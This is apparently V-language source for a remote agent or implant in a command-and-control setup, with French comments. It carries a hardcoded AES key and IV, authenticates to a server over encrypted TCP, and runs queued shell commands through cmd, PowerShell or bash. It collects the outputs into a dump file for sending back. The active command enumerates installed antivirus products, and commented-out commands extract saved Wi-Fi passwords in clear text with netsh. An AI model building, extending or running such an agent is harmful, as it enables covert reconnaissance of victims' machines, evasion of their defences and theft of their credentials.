import os
import time
import net
import crypto.aes
import crypto.cipher


enum ModuleState as u8 {
	unknown		// inconnu
	started		// le module est démarré mais n'a pas commencé
	running		// en cours de traitement
	error		// le module est en erreur
	finish		// le module à terminé son travail
}

enum Module as u8 {
	ecoute = 0
	execution = 1
	envoie = 2
}

// le type de shell dans lequel la commande doit s'exécuter
enum ShellType as u8 {
	cmd
	powershell
	bash
}

struct Commande {
	command string
	type_shell ShellType
	id string // id de la commande
}

struct Response{
	output string
	index int // index de la commande dans la liste "commandes_list"
	exit_code int
}

struct SharedVariable {
	agent_identifier string = "<id-agent>" // de la forme "agent-x" ou x est le numèro de l'agent
	cryptkey []u8 = [u8(58), 140, 235, 100, 85, 188, 29, 129, 132, 36, 177, 236, 124, 169, 4, 175, 89, 170, 88, 188, 201, 63, 59, 248, 110, 119, 237, 167, 81, 146, 200, 224] // la clé de chiffrement pour le module d'écoute ou d'envoi
	// exemple de cryptkey : 58, 140, 235, 100, 85, 188, 29, 129, 132, 36, 177, 236, 124, 169, 4, 175, 89, 170, 88, 188, 201, 63, 59, 248, 110, 119, 237, 167, 81, 146, 200, 224
	iv []u8 = [u8(116), 29, 251, 88, 134, 70, 51, 219, 159, 174, 205, 64, 142, 107, 136, 74] // le vecteur d'initialisation pour le chiffrement aes-256-cbc
	// exemple d'iv : 116, 29, 251, 88, 134, 70, 51, 219, 159, 174, 205, 64, 142, 107, 136, 74

	number_of_module int = 3

    commandes_list []Commande = [
		//Commande{command: '\$tmp_networks = (netsh wlan show profile | select-string "Profil Tous les");\$networks = ((\$tmp_networks -split (\':\') -split (\'Profil Tous les utilisateurs\')) | Select-String \'[A-Z]|[0-9]\') -replace " ","";foreach(\$network in \$networks){ netsh wlan show profile \$network key=clear}', type_shell: ShellType.powershell, id: "SYSTEMINFO"},
		//Commande{command: '\"netsh wlan show profiles | Select-String \": \" | ForEach-Object { \$_.ToString().Split(\":\")[1].Trim() } | ForEach-Object { netsh wlan show profile name=\$_ key=clear | Select-String \"Contenu de la clé\" } | ForEach-Object { \$_.ToString().Split(\":\")[1].Trim() }\"', type_shell: ShellType.powershell, id: "SYSTEMINFO"},
		//Commande{command: "netsh wlan show profiles | Select-String \\': \\' | ForEach-Object { \$_.ToString().Split(\\':\\')[1].Trim() } | ForEach-Object { netsh wlan show profile name=\$_ key=clear }", type_shell: ShellType.powershell, id: "SYSTEMINFO"},
		Commande{command: 'Get-WmiObject -Namespace "root\\SecurityCenter2" -Class AntiVirusProduct -ErrorAction Stop', type_shell: ShellType.powershell, id: "SYSTEMINFO"},
		
	]
mut:
	execution_commande_list []int
	ip []u8 = [u8(127),0,0,1]
	response_list []Response
	module_state shared []ModuleState = [ModuleState.unknown, ModuleState.unknown, ModuleState.unknown]
	module_state_description shared []string = ['','','']
}

fn main(){
	shared shared_variable := SharedVariable{}
	authentification(shared shared_variable,"REPORT")
	/*sw := time.new_stopwatch()
	shared_variable.module_ecoute()
	rlock shared_variable {
		println("\n[[[[ MODULE STATUS ]]]]")
		println(show_all_module_status(shared_variable))

		println("\n[[[ SHARED VARIABLES ]]]")
		//dump_shared_variable(shared_variable)
	}
		println("[i] - fin d'éxecution. Temps d'énumeration  ${sw.elapsed().seconds()}")*/
}

fn dump_shared_variable(sv &SharedVariable){
	println("=======================-[Dump des shared variables]-=======================")
		println("	identifiant de l'agent : ${sv.agent_identifier}")
		for c in sv.commandes_list	{
			println("${c}")
		}
		println("	list d'execution : ${sv.execution_commande_list}")
		println("	ip : ${sv.ip}")
		println("	response_list : ${sv.response_list}")
		rlock sv.module_state {
			println("	module state be like : ${sv.module_state}")
		}
}

fn show_all_module_status(sv &SharedVariable) string {
	mut rst := '\n'
	unsafe {
		for i in 0..sv.number_of_module {
			rst += '==== Module ' + Module(i).str() + ' :\n'
			rlock sv.module_state, sv.module_state_description {
				rst += ' - status : ' + sv.module_state[i].str() + '\n'
				rst += ' - description : ' + sv.module_state_description[i] + '\n'
			}
			rst += '\n'
		}
	}

	return rst
}

// ------------------------------------------------------------------------- fonction nécessaire en cas d'utilisation de socket
fn pad_message(message []u8) []u8 {
    block_size := 16
    padding_size := block_size - (message.len % block_size)
    mut padding := []u8{}
    for i := 0; i < padding_size; i++ {
        padding << u8(padding_size)
    }
    mut padded_message := message.clone()
    for pad in padding {
        padded_message << pad
    }
    return padded_message
}

fn unpad_message(message []u8) []u8 {
    padding_size := int(message[message.len - 1])
    return message[..message.len - padding_size]
}

fn aes_cbc_en(mut src []u8, key []u8, iv []u8) {
    block := aes.new_cipher(key)
    mut mode := cipher.new_cbc(block, iv)
    mode.encrypt_blocks(mut src, src.clone())
}

fn aes_cbc_de(mut src []u8, key []u8, iv []u8) {
    block := aes.new_cipher(key)
    mut mode := cipher.new_cbc(block, iv)
    mode.decrypt_blocks(mut src, src.clone())
}

fn read_encrypt_message(mut response &string, key []u8, iv []u8, mut sock net.TcpConn) bool {
 	mut buf := []u8{len: 9082}
    num_bytes := sock.read(mut buf) or {
        println('Failed to read from client: $err')
        return false // une erreur
    }

    // Decrypt and unpad
    aes_cbc_de(mut buf[..num_bytes], key, iv)
    decrypted_message := unpad_message(buf[..num_bytes])
    response = decrypted_message.bytestr()
    return true
}

fn write_encrypt_message(message string, key []u8, iv []u8, mut sock net.TcpConn) bool {
	mut padded_message := pad_message(message.bytes())
    aes_cbc_en(mut padded_message, key, iv)

    // Send the encrypted output to the server
    sock.write(padded_message) or {
    	println('Failed to send output to server: $err')
    	return false // erreur
    }

    return true // réussite
}

fn authentification(shared sv &SharedVariable, typeCommunication string) bool {
	mut key := []u8{len: 32}
    mut iv := []u8{len: 16}
    mut agent_id := ''
    server_addr := "127.0.0.1:8080" // argument à changer

	rlock sv {
		key = sv.cryptkey.clone()
		iv = sv.iv.clone()
		agent_id = sv.agent_identifier
	}
	//print('connect ...')
	// On se connecte au serveur
    mut sock := net.dial_tcp(server_addr) or {
        println('Failed to connect to server: $err')
        return false
    }
	//print('write id ...')
	//println(agent_id.bytes())
	// On envoie l'id de l'agent en clair
    sock.write(agent_id.bytes()) or {
        println('Failed to send key to server: $err')
        return false
    }

	//print('wait response ...')
	// On attend de recevoir le "ACCEPT"
	mut response := ''
	if !read_encrypt_message(mut response,key,iv,mut sock) {
		println("Erreur - lors de l'attente du 'ACCEPT'")
		return false
	}

	if !write_encrypt_message(typeCommunication,key,iv, mut sock) {
		println("Erreur - lors de l'envoi du type de communication")
		return false
	}

	print("Authentification réussi !")
	return true
}

// ------------------------------------------------------------------------- Module écoute
fn (shared sv SharedVariable) module_ecoute(){
	lock sv.module_state {
		sv.module_state[Module.ecoute] = ModuleState.running
	}

	// on remplis le tableau des commandes à exécuter
	lock sv {
		for i in 0 .. sv.commandes_list.len {
			sv.execution_commande_list << i
		}
	}

	m_execution := spawn sv.module_execution()
	m_envoie := spawn sv.module_envoie()
	m_execution.wait()
	m_envoie.wait()

	lock sv.module_state {
		sv.module_state[Module.ecoute] = ModuleState.finish
	}
}

// ------------------------------------------------------------------------- Module exécution
fn (shared sv SharedVariable) module_execution() {

    lock sv.module_state {
        sv.module_state[Module.execution] = ModuleState.running
    }

    for cmd_index in sv.execution_commande_list {
        mut cmd := Commande{}
        rlock sv {
            cmd = sv.commandes_list[cmd_index]
        }

        mut shell_command := ""
        if cmd.type_shell == ShellType.cmd {
            shell_command = "cmd /c " + cmd.command
        } else if cmd.type_shell == ShellType.powershell {
			//print("commande : " + "powershell.exe -Command " + cmd.command)
            shell_command = "powershell.exe -Command " + cmd.command 
			print(shell_command)
        } else if cmd.type_shell == ShellType.bash {
			shell_command = "bash -c \'" + cmd.command + "\'"
		}

        exec_result := os.execute(shell_command)

        lock sv {
            sv.response_list << Response{output: exec_result.output.trim_space(), index: cmd_index, exit_code: exec_result.exit_code}
        }
    }

    lock sv.module_state {
        sv.module_state[Module.execution] = ModuleState.finish
    }
}

// ------------------------------------------------------------------------- Module envoie - import net.http
fn (shared sv SharedVariable) module_envoie() {
	dump_filename := "dump_file.txt" // argument modifiable à la compilation

	lock sv.module_state {
        sv.module_state[Module.envoie] = ModuleState.started
    }

	mut s := ModuleState.unknown

	for {
		
		rlock sv.module_state {
			s = sv.module_state[Module.execution]
		}

		if s == ModuleState.finish {
			break
		}

		time.sleep(10 * time.millisecond)
	}

	lock sv.module_state {
        sv.module_state[Module.envoie] = ModuleState.running
    }

	mut final_enum_file := ""
	mut header := ""
	for i in 0..sv.response_list.len {

		header = sv.commandes_list[sv.response_list[i].index].id
		rlock sv {
			header += " "  + sv.response_list[i].exit_code.str()
			header += " " + (sv.response_list[i].output.count("\n") + 1).str() + "\n"
		}
		final_enum_file += header + sv.response_list[i].output + "\n"
	}
	final_enum_file = final_enum_file.trim_space()

	mut file := os.create(dump_filename) or {
		lock sv.module_state {
        	sv.module_state[Module.envoie] = ModuleState.error
    	}
		return
	}
	file.write_string(final_enum_file)  or {
		lock sv.module_state {
        	sv.module_state[Module.envoie] = ModuleState.error
    	}
		return
	}
	file.close()

	lock sv.module_state {
        sv.module_state[Module.envoie] = ModuleState.finish
    }

}